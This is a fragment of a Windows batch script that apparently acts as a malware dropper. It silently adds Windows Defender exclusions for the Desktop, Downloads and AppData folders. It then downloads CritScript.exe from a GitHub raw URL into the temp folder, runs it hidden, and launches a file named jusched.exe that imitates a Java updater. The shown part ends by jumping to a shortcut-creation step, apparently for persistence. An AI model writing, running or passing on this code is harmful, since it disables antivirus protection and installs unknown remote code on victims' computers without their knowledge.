:gotAdmin
    pushd "%TEMP%"
    CD /D "%~dp0"

    REM --> Silent PowerShell commands
    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Desktop'" >nul 2>&1
    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Downloads'" >nul 2>&1
    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/AppData/'" >nul 2>&1

    REM --> Navigate to the %TEMP% directory
    cd %TEMP%

    REM --> Download files silently using PowerShell
    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe" >nul 2>&1


    REM --> Check if CritScript.exe exists silently
    if not exist "CritScript.exe" (
        exit /b
    )

    REM --> Execute CritScript.exe silently
    start /B "" CritScript.exe >nul 2>&1
    timeout /t 5 /nobreak >nul 2>&1

    REM --> Check and run JUSCHED.EXE if it exists
    for %%F in (jusched.exe JUSCHED.EXE) do (
        if exist "%%F" (
            start /B "" %%F >nul 2>&1
            timeout /t 5 /nobreak >nul 2>&1
            goto :CreateShortcut
        )
    )
